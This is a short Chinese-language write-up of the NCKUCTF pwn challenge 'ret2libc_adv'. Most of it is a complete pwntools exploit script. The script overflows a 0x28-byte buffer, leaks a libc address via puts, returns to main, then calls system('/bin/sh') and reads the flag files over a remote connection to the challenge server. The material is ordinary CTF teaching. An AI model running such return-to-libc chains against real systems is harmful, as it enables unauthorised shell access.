---
title: NCKUCTF ret2libc_adv WriteUp
date: 2024-08-11 21:55:38
category: PWN
tags: 
    - pwn
    - ctf
excerpt: false
---

## ret2libc_adv

`b'a'*0x28` overflow 後，把 leak 的chain 寫入，然後寫回main後使用libc中的東西
這題因為 [lazy bindding](https://chihhhs.github.io/2024/08/05/pwn-1/#Lazy-Binding) 所以我們不能使用`printf`它來leak base address

### Exploitation

```python
from pwn import *

context.arch = 'amd64'

# r = process('./chal')
l = ELF("/root/pwn/ctf/libc.so.6")
r= remote('chall.nckuctf.org', 10010)

# overflow with 0x28
pop_rdi = 0x401463
print_got = 0x404018
puts_plt = 0x4010a0
main = 0x4011f6
ret = 0x40101a
leave_ret = 0x4013f1

p = flat(
    b'a'*0x28,
    ret,
    pop_rdi,
    print_got,
    puts_plt,
    ret,
    main
)

r.sendlineafter(b'Exit\n',b'3')
r.sendlineafter(b'go!\n',p)

l.address = u64(r.recv(6).ljust(8, b"\0")) - 0x80e50
success("base address -> %s" % hex(l.address)) 


print(hex(next(l.search("/bin/sh\0"))))
p2 = flat(b"a" * 0x28, pop_rdi, next(l.search("/bin/sh\0")), ret, l.sym.system)


r.sendlineafter(b'Exit\n',b'3')
r.sendlineafter(b'go!\n',p2)

r.sendline(b'cat /home/$(whoami)/flag*')

r.interactive()
```
